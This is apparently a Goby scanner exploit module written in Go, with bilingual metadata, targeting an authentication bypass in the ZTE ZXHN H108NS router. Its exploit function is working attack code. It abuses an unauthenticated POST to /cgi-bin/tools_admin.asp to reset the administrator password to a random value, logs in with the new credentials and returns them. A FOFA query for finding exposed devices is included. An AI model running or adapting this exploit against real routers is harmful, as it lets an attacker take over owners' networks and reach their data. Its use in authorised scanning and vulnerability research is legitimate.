package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ZXHN H108NS Router tools_admin.asp Permission Bypass Vulnerability",
    "Description": "<p>ZTE H108NS router is a router product that integrates WiFi management, route allocation, dynamic access to Internet connections and other functions.</p><p>The ZTE H108NS router has an identity authentication bypass vulnerability. An attacker can use this vulnerability to bypass identity authentication and allow access to the router's management panel to modify the administrator password to obtain sensitive user information.</p>",
    "Product": "ZTE-H108NS",
    "Homepage": "https://www.zte.com.cn/china/",
    "DisclosureDate": "2022-12-01",
    "Author": "heiyeleng",
    "FofaQuery": "banner=\"Basic realm=\\\"H108NS\\\"\" || header=\"Basic realm=\\\"H108NS\\\"\"",
    "GobyQuery": "banner=\"Basic realm=\\\"H108NS\\\"\" || header=\"Basic realm=\\\"H108NS\\\"\"",
    "Level": "2",
    "Impact": "<p>An attacker can use this vulnerability to bypass identity authentication and allow access to the management panel of the router to modify the administrator password and obtain sensitive information of the user.</p>",
    "Recommendation": "<p>The manufacturer has not yet provided a vulnerability repair scheme. Please follow the manufacturer's homepage to update it in a timely manner: https://www.zte.com.cn/china/.</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "中兴 H108NS 路由器 tools_admin.asp 文件权限绕过漏洞",
            "Product": "ZTE-H108NS",
            "Description": "<p>中兴H108NS路由器是一款集WiFi管理、路由分配、动态获取上网连接等功能于一体的路由器产品。<br></p><p>中兴H108NS路由器存在身份认证绕过漏洞，攻击者可利用该漏洞绕过身份认证允许访问路由器的管理面板修改管理员密码，获取用户的敏感信息。<br></p>",
            "Recommendation": "<p>厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://www.zte.com.cn/china/\" target=\"_blank\">https://www.zte.com.cn/china/</a>。</p>",
            "Impact": "<p>攻击者可利用该漏洞绕过身份认证允许访问路由器的管理面板修改管理员密码，获取用户的敏感信息。</span><br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "ZXHN H108NS Router tools_admin.asp Permission Bypass Vulnerability",
            "Product": "ZTE-H108NS",
            "Description": "<p>ZTE H108NS router is a router product that integrates WiFi management, route allocation, dynamic access to Internet connections and other functions.</p><p>The ZTE H108NS router has an identity authentication bypass vulnerability. An attacker can use this vulnerability to bypass identity authentication and allow access to the router's management panel to modify the administrator password to obtain sensitive user information.</p>",
            "Recommendation": "<p><span style=\"font-size: medium;\">The manufacturer has not yet provided a vulnerability repair scheme. Please follow the manufacturer's homepage to update it in a timely manner: <a href=\"https://www.zte.com.cn/china/\" target=\"_blank\">https://www.zte.com.cn/china/</a>.</span><br></p>",
            "Impact": "<p>An attacker can use this vulnerability to bypass identity authentication and allow access to the management panel of the router to modify the administrator password and obtain sensitive information of the user.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10774"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 401 && strings.Contains(resp.RawBody, "Unauthorized") && strings.Contains(resp.RawBody, "/cgi-bin/index.asp") {
					cookie := resp.Cookie
					cfg1 := httpclient.NewPostRequestConfig("/cgi-bin/tools_admin.asp")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					cfg1.Header.Store("DNT", "1")
					cfg1.Header.Store("Cookie", cookie)
					cfg1.Data = "\n\n"
					if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Administrator") && strings.Contains(resp.RawBody, "Confirm Password")

					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 401 && strings.Contains(resp.RawBody, "Unauthorized") && strings.Contains(resp.RawBody, "/cgi-bin/index.asp") {
					cookie := resp.Cookie
					cfg1 := httpclient.NewPostRequestConfig("/cgi-bin/tools_admin.asp")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					cfg1.Header.Store("DNT", "1")
					cfg1.Header.Store("Cookie", cookie)
					cfg1.Data = "\n\n"
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Administrator") && strings.Contains(resp.RawBody, "Confirm Password") {
							cfg2 := httpclient.NewPostRequestConfig("/cgi-bin/tools_admin.asp")
							cfg2.VerifyTls = false
							cfg2.FollowRedirect = false
							cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg2.Header.Store("Cookie", cookie)
							password := goutils.RandomHexString(8)
							cfg2.Data = "adminFlag=1&CurrentAccess=0&uiViewTools_Password=" + password + "&uiViewTools_PasswordConfirm=" + password + ""
							if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
								if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "admin") && strings.Contains(resp.RawBody, "New Password") {
									cfg3 := httpclient.NewGetRequestConfig("/cgi-bin/tools_admin.asp")
									cfg3.VerifyTls = false
									cfg3.FollowRedirect = false
									loginAuth := base64.StdEncoding.EncodeToString([]byte("admin:" + password + ""))
									cfg3.Header.Store("Authorization", "Basic "+loginAuth+"")
									cfg3.Header.Store("Cookie", cookie)
									if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
										if resp.StatusCode == 200 {
											cfg4 := httpclient.NewGetRequestConfig("/cgi-bin/index.asp")
											cfg4.VerifyTls = false
											cfg4.FollowRedirect = false
											cfg4.Header.Store("Authorization", "Basic "+loginAuth+"")
											cfg4.Header.Store("Cookie", cookie)
											if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil {
												if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "/cgi-bin/status.asp") && strings.Contains(resp.RawBody, "/cgi-bin/wizardPPP_OTE.asp") {
													expResult.Output = "admin:" + password
													expResult.Success = true
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
